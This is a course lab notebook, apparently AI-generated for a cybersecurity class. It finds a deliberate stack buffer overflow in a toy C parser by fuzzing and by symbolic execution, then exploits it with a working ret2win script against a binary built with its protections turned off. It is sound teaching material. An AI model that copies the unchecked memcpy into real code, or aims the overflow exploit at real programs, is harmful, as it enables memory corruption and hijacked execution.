<div style="border:3px solid #c0392b;background:#fdecea;padding:16px 20px;border-radius:8px;font-family:ui-sans-serif,system-ui,sans-serif;color:#7b1a10;line-height:1.55"><div style="color:#c0392b;font-weight:800;font-size:18px;margin-bottom:4px">⚠️ Generated by Claude</div>Prof. Kristopher Micinski generated this lab via Claude, under his direction. <span style="opacity:.85">(Original implementation: Claude Fable 5.1.)</span></div>

# Finding and exploiting a memory-safety bug, three ways

### CIS400 / CIS600 · Cybersecurity & AI · Reverse-Engineering Lab

One tiny C program has one classic bug: it copies a length-controlled payload
into a fixed 64-byte stack buffer without checking the length. A length field is
data. Here the program trusts it as control. That is the same failure as a stack
buffer overflow, as SQL injection, and as prompt injection, a pattern this course
returns to often.

You will find the bug three ways and then exploit it:

1. **Fuzzing.** Generate inputs until a sanitizer reports the overflow.
2. **Symbolic execution.** Derive a crashing input with an SMT solver.
3. **By hand.** Turn the crash into control flow: a `ret2win` that captures a flag.

> **Everything here is a sandbox.** This notebook compiles and attacks its own
> toy binary inside your Colab VM. It uses no network and no other machine. These
> techniques are taught for defense. Use them only on systems you are authorized
> to test.

**Time:** about 15 to 20 minutes. **How to run:** Runtime > Run all, then read
top to bottom. Each code cell prints what it did.

## 0 · Provision the sandbox

Colab runs a real x86-64 Linux VM. We install a C toolchain, the LLVM sanitizers
with libFuzzer, and `z3`, the SMT solver. This takes about 30 to 60 seconds the
first time.

In [ ]:
import os
os.environ['ASAN_OPTIONS'] = 'detect_leaks=0'   # keep sanitizer output clean

!sudo apt-get -qq update >/dev/null 2>&1
!sudo apt-get -qq install -y clang llvm libclang-rt-dev binutils >/dev/null 2>&1
!pip -q install z3-solver >/dev/null 2>&1

# The 'flag' this exercise captures. In a real CTF it would live only on a
# server; here it is a local file so the exploit has something to print.
open('flag.txt','w').write('CIS400{fuzz_symbex_and_a_ret2win_walk_into_a_bar}\n')

import shutil, subprocess
print('clang :', subprocess.run(['clang','--version'],capture_output=True,text=True).stdout.splitlines()[0])
print('z3    :', __import__('z3').get_version_string())
print('\nsandbox ready')

## 1 · The target

The program parses an *activation record* from standard input:

```
+--------+------------+---------------------------+
| "CIS4" | len (2 B)  |   payload (len bytes)     |
+--------+------------+---------------------------+
  magic     big-endian    copied into char buf[64]
```

`handle_record()` reads the 16-bit `len` straight from the record and calls
`memcpy(buf, in+6, len)` into a 64-byte stack buffer, with no check that
`len <= 64`. The program also contains a function, `print_flag()`, that the
normal path never calls. That function matters later.

In [ ]:
%%writefile vuln.c
/* vuln.c - intentionally vulnerable record parser (CIS400 lab). */
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

/* The "win" gate: no call site exists on the normal path. Raw syscalls keep it
   alignment-insensitive, so a ret2win lands reliably. */
void print_flag(void) {
    char buf[128];
    int fd = open("flag.txt", O_RDONLY);
    if (fd < 0) { write(1, "flag.txt missing\n", 17); return; }
    ssize_t n = read(fd, buf, sizeof buf);
    if (n > 0) write(1, buf, (size_t)n);
    close(fd);
}

int handle_record(const unsigned char *in, size_t n) {
    char buf[64];
    if (n < 6) return -1;
    if (memcmp(in, "CIS4", 4) != 0) return -1;       /* magic gate */
    uint16_t len = (uint16_t)((in[4] << 8) | in[5]);  /* claimed length (BE) */
    memcpy(buf, in + 6, len);                         /* BUG: no len <= 64 check */
    volatile char sink = buf[0];                      /* keep the copy observable */
    (void)sink;
    return 0;
}

#ifndef NO_MAIN
int main(void) {
    unsigned char in[4096];
    ssize_t n = read(0, in, sizeof in);
    if (n < 6) { write(1, "denied\n", 7); return 1; }
    if (handle_record(in, (size_t)n) == 0) write(1, "ok\n", 3);
    else                                   write(1, "denied\n", 7);
    return 0;
}
#endif

### What the overflow does to the stack

When `memcpy` writes more than 64 bytes it runs off `buf`, over the saved base
pointer, and onto the saved return address, which is the value the CPU jumps to
when `handle_record` returns. Whoever controls that value controls execution.

In [ ]:
from IPython.display import HTML, display
display(HTML(r'''
<svg viewBox="0 0 860 300" width="100%" style="max-width:860px;font-family:ui-sans-serif,system-ui,sans-serif">
  <defs><marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#F76900"/></marker></defs>
  <text x="120" y="28" text-anchor="middle" font-weight="700" fill="#000E54">the record you send</text>
  <rect x="20"  y="45" width="70"  height="48" rx="6" fill="#0AA6B7" opacity=".85"/><text x="55"  y="75" text-anchor="middle" fill="#fff" font-size="13">CIS4</text>
  <rect x="92"  y="45" width="56"  height="48" rx="6" fill="#000E54"/><text x="120" y="75" text-anchor="middle" fill="#fff" font-size="12">len</text>
  <rect x="150" y="45" width="90"  height="48" rx="6" fill="#F76900"/><text x="195" y="75" text-anchor="middle" fill="#fff" font-size="12">payload…</text>
  <text x="195" y="115" text-anchor="middle" fill="#F76900" font-size="12">memcpy copies <tspan font-weight="700">len</tspan> bytes ▶</text>
  <text x="640" y="28" text-anchor="middle" font-weight="700" fill="#000E54">handle_record() stack frame</text>
  <rect x="470" y="45"  width="340" height="150" rx="8" fill="#eaf1f7" stroke="#000E54"/><text x="640" y="128" text-anchor="middle" fill="#000E54" font-size="15">char buf[64]</text>
  <rect x="470" y="195" width="340" height="38" rx="6" fill="#c9d6e5" stroke="#000E54"/><text x="640" y="219" text-anchor="middle" fill="#000E54" font-size="12">saved RBP (8 B)</text>
  <rect x="470" y="233" width="340" height="44" rx="6" fill="#F76900"/><text x="640" y="260" text-anchor="middle" fill="#fff" font-weight="700" font-size="13">saved return address</text>
  <path d="M455,150 C455,250 455,255 468,255" fill="none" stroke="#F76900" stroke-width="2.5" marker-end="url(#ar)"/>
  <text x="250" y="270" fill="#F76900" font-size="12">overflow writes DOWN the frame ⟶ reaches the return address at offset 64+8</text>
</svg>'''))

## 2 · Find it by fuzzing

A fuzzer generates inputs, runs the target, and keeps the inputs that reach new
code. We compile with **libFuzzer** as the input generator and
**AddressSanitizer** as the detector that reports the exact memory error. We
seed it with one valid record so it starts past the `CIS4` gate.

In [ ]:
%%writefile harness.c
/* libFuzzer feeds bytes straight into handle_record(). */
#include <stddef.h>
#include <stdint.h>
int handle_record(const unsigned char *in, size_t n);
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size){ handle_record(data,size); return 0; }

In [ ]:
import os, subprocess, textwrap
os.makedirs('corpus', exist_ok=True)
open('corpus/seed','wb').write(b'CIS4\x00\x08payload!')   # valid record, len=8

# -O0 so the optimizer can't delete the 'dead' buffer; fuzzer+ASan in one binary
subprocess.run('clang -g -O0 -fsanitize=fuzzer,address -w -DNO_MAIN harness.c vuln.c -o fuzz-bin',
               shell=True, check=True)

r = subprocess.run('./fuzz-bin -max_len=256 -max_total_time=20 -artifact_prefix=./ corpus',
                   shell=True, capture_output=True, text=True)
out = r.stdout + r.stderr
# show the crash headline + the frame that names our bug
keep = [l for l in out.splitlines() if any(k in l for k in
        ('ERROR: AddressSanitizer','READ of size','WRITE of size','handle_record','SUMMARY','Test unit'))]
print('\n'.join(keep[:10]))

import glob, binascii
crash = sorted(glob.glob('crash-*'))
if crash:
    b = open(crash[0],'rb').read()
    print('\ncrashing input:', binascii.hexlify(b).decode(),
          '  ->  magic', b[:4], ' len =', int.from_bytes(b[4:6],'big'))

**Read the report.** The input claims a large `len` but sends only a few bytes,
so the copy runs far past what we supplied. AddressSanitizer reports the
out-of-bounds access and points at the `memcpy` in `vuln.c`. The fuzzer found
this in seconds because almost any oversized length triggers it, so the set of
crashing inputs is enormous.

## 3 · Find it by symbolic execution

Rather than guess inputs, we reason about them. We make the input bytes
**symbolic** (each byte is a variable, not a fixed value), walk the parser one
statement at a time, collect the conditions needed to reach the `memcpy`, and ask
Z3 one question:

> *Is there any input that reaches the copy and makes `len > 64`?*

If the answer is **SAT**, Z3 returns a concrete crashing record. If it is
**UNSAT**, no such input exists, which is a proof. The solver also satisfies the
4-byte `CIS4` gate directly, where a blind fuzzer would have to search for it.

In [ ]:
from z3 import BitVec, BitVecVal, ZeroExt, Optimize, sat, unsat, UGT, UGE, ULE, And

def solve(fixed=False):
    BUF = 64
    n = BitVec('record_len', 32)
    m = [BitVec(f'magic{i}', 8) for i in range(4)]
    lhi, llo = BitVec('len_hi', 8), BitVec('len_lo', 8)
    length = ZeroExt(16, (ZeroExt(8, lhi) << 8) | ZeroExt(8, llo))
    pc = [UGE(n, BitVecVal(6, 32))]                       # if (n < 6) return
    for v, ch in zip(m, b'CIS4'): pc.append(v == ch)      # magic gate PASS edge
    if fixed: pc.append(ULE(length, BitVecVal(BUF, 32)))  # the fix: len <= 64
    oob = UGT(length, BitVecVal(BUF, 32))                 # sink: overflow buf[64]
    opt = Optimize()
    for c in pc: opt.add(c)
    opt.add(oob); opt.maximize(length)
    if opt.check() == unsat:
        return None
    mdl = opt.model()
    val = lambda name: (mdl[BitVec(name,8)].as_long() if mdl[BitVec(name,8)] is not None else 0)
    return (val('len_hi') << 8) | val('len_lo')

L = solve()
print(f'SAT  -> solver derived a crashing record: magic=CIS4, len={L} (0x{L:04x}) > 64')
print('proof-of-fix:', 'UNSAT (safe for ALL inputs)' if solve(fixed=True) is None else 'still SAT?!')

# Like Heartbleed, the length FIELD is the weapon: claim huge, send nothing.
open('crash_from_symbex.bin','wb').write(b'CIS4' + L.to_bytes(2,'big'))
print('\nwrote 6-byte attack record (header only): CIS4', L.to_bytes(2,'big').hex())

In [ ]:
# Confirm the solver's record really crashes the REAL compiled code, under ASan.
import subprocess
subprocess.run('clang -g -O0 -fsanitize=address -w vuln.c -o vuln-asan', shell=True, check=True)
r = subprocess.run('./vuln-asan < crash_from_symbex.bin', shell=True, capture_output=True, text=True)
out = r.stdout + r.stderr
keep = [l for l in out.splitlines() if any(k in l for k in
        ('ERROR: AddressSanitizer','WRITE of size','stack-buffer-overflow','handle_record'))]
print('\n'.join(keep[:6]) if keep else out[:800])

## 3½ · The same bug, found by a production engine: KLEE

The Z3 script above is a small one written by hand. **KLEE** is a mature,
LLVM-based symbolic execution engine. We compile the real program to bitcode,
mark the record symbolic with `klee_make_symbolic`, and KLEE explores the paths
and checks every memory access against the bounds of its object. It finds the
path conditions on its own.

KLEE ships as a roughly 2 GB Docker image. We do not pull it live in Colab,
because Colab's shared IP addresses are often rate-limited by Docker Hub and the
pull fails unpredictably in class. The harness, the commands, and a real captured
run are below, and you can reproduce it wherever you have Docker.

In [ ]:
%%writefile klee_harness.c
/* KLEE entry point: a fully symbolic record handed to handle_record(). */
#include <klee/klee.h>
#include <stddef.h>
int handle_record(const unsigned char *in, size_t n);
int main(void){
    unsigned char in[200];
    klee_make_symbolic(in, sizeof in, "record");
    return handle_record(in, sizeof in);
}

**Run it yourself (local Docker).** KLEE ships as an image, so on any machine
with Docker this reproduces the result in seconds. The exact one-line command is
in `klee/README.md`: it mounts this lab's `vuln.c` and `klee/harness.c` into the
`klee/klee` image, compiles them to LLVM bitcode, and runs KLEE.

**What KLEE reports** (captured from a real run, so you see the result here
without installing anything):

```
KLEE: ERROR: libc/string/memcpy.c:29: memory error: out of bound pointer
Stack:
    #00 in memcpy (n=symbolic)
    #10 in handle_record (in=..., n=200) at vuln.c:45
KLEE: done: generated tests = 70

=== concrete crashing record KLEE derived ===
object 0: text: CIS4...........   (magic = CIS4, len field = 0x0100 = 256 > 64)
```

KLEE satisfied the `CIS4` gate and found a `len` that overflows `buf[64]`. That
is the same bug the fuzzer found and the Z3 script derived, now produced by a
tool used in real security research.

### Comparing the two approaches

Random search does well when the bug is easy to hit and poorly when it hides
behind an exact value. A solver behaves the opposite way. The plot below shows
the expected work to get past an N-byte magic value.

In [ ]:
import matplotlib.pyplot as plt
import numpy as np
N = np.arange(1, 9)
blind   = 256.0**N          # blind fuzzing: guess every byte
guided  = 256.0*N           # coverage/value-profile fuzzing: byte-by-byte
symbex  = np.ones_like(N, dtype=float)   # solver: one query
fig, ax = plt.subplots(figsize=(7,4))
ax.set_yscale('log')
ax.plot(N, blind,  'o-', color='#F76900', lw=2, label='blind fuzzing  (256^N)')
ax.plot(N, guided, 's-', color='#0AA6B7', lw=2, label='guided fuzzing (~256·N)')
ax.plot(N, symbex, '^-', color='#000E54', lw=2, label='symbolic execution (1 solve)')
ax.set_xlabel('bytes of exact magic the input must match')
ax.set_ylabel('expected attempts (log scale)')
ax.set_title('Getting past a magic-value gate: search vs. solve')
ax.grid(True, which='both', ls=':', alpha=.4); ax.legend()
plt.tight_layout(); plt.show()

## 4 · Weaponize it by hand: `ret2win`

Finding the bug is one thing; taking control of execution is another. Here we
overwrite the saved return address with the address of `print_flag()`. We build
the target with the classic defenses off (no stack canary, no PIE, no CET) so
this first exploit is about the core idea rather than about defeating
mitigations. A follow-on lab turns those defenses back on.

We do not hardcode the offset. We sweep candidate offsets and keep the one that
makes the flag appear, which is how you would locate it on an unknown binary.

In [ ]:
import subprocess, struct
# (We script this with the standard library, not pwntools: importing pwntools'
#  top level runs terminal setup that crashes inside notebook kernels.)

subprocess.run('gcc -g -O0 -fno-stack-protector -no-pie -fcf-protection=none -w vuln.c -o vuln',
               shell=True, check=True)

# print_flag has a FIXED address (the binary is -no-pie); read it from the symbol table.
nm  = subprocess.check_output(['nm', 'vuln'], text=True)
win = int(next(l for l in nm.splitlines() if l.endswith(' print_flag')).split()[0], 16)
print(f'print_flag() lives at {hex(win)} (fixed, because the binary is -no-pie)')

def fire(offset):
    payload = b'A'*offset + struct.pack('<Q', win)                 # return address (little-endian)
    record  = b'CIS4' + struct.pack('>H', len(payload)) + payload  # the len field is BIG-endian!
    r = subprocess.run(['./vuln'], input=record, capture_output=True, timeout=5)
    return r.stdout + r.stderr

OFFSET = None
for off in range(64, 129, 8):
    out = fire(off)
    hit = b'CIS400{' in out
    print(f'  offset {off:3d}: {"FLAG!" if hit else "no flag"}')
    if hit:
        OFFSET = off; print('\n🏁 ' + out.decode(errors='replace').strip()); break
assert OFFSET, 'no offset captured the flag'
print(f'\nreturn address sits {OFFSET} bytes into the payload (64 buf + 8 saved RBP + alignment).')

### The bytes you actually sent

In [ ]:
import matplotlib.pyplot as plt
from matplotlib.patches import Rectangle
fig, ax = plt.subplots(figsize=(9,1.7))
ax.add_patch(Rectangle((0,0), OFFSET, 1, facecolor='#000E54'))
ax.add_patch(Rectangle((OFFSET,0), 8, 1, facecolor='#F76900'))
ax.text(OFFSET/2, .5, f"{OFFSET} bytes of 'A' padding", ha='center', va='center', color='white', fontsize=11)
ax.text(OFFSET+4, .5, '&print_flag', ha='center', va='center', color='white', fontsize=9, rotation=0)
ax.annotate('overwrites the saved return address', xy=(OFFSET+4, 1.02), xytext=(OFFSET-6, 1.8),
            ha='center', color='#F76900', fontsize=10, arrowprops=dict(arrowstyle='->', color='#F76900'))
ax.set_xlim(0, OFFSET+8); ax.set_ylim(0, 2); ax.set_yticks([])
ax.set_xlabel('byte offset in the payload'); ax.set_title('ret2win payload')
plt.tight_layout(); plt.show()

## 5 · What just happened, and why it matters

One missing bounds check gave us three results:

| Technique | What it needed | What it found |
|---|---|---|
| **Fuzzing** | a harness and a seed | an oversized-length crash, in seconds |
| **Symbolic execution** | a model of the parser | a derived crash and a proof of the fix |
| **By-hand ret2win** | the offset and a target function | full control: the flag |

**The course throughline.** The bug is control/data confusion: a *length field*
(data) trusted as a *copy count* (control). Buffer overflow, SQL injection, and
prompt injection are the same mistake in different eras.

**Why it was this easy.** We disabled the modern defenses. Turn them back on and
each step above breaks:

- **Stack canary.** A secret guard sits between `buf` and the return address. The
  overflow smashes it and the process aborts before returning, so step 4 fails
  first.
- **NX.** The stack is not executable. We avoided this by reusing existing code
  instead of injecting our own.
- **PIE and ASLR.** `print_flag`'s address is randomized, so the fixed address
  becomes a guess and you need an information leak first.
- **CET shadow stack.** Hardware records the real return address and checks it on
  return.

**The hype filter.** When someone claims an AI agent finds and exploits bugs, ask
the questions this lab makes concrete: on which binaries, with which defenses
enabled, and at what measured success rate? Succeeding on this toy with the
defenses off says little about hardened production code.

**Next.** A follow-on lab turns the defenses back on: NX with return-oriented
programming, then a stripped binary with PIE and ASLR that requires an
information leak. Same class of bug, a much higher bar.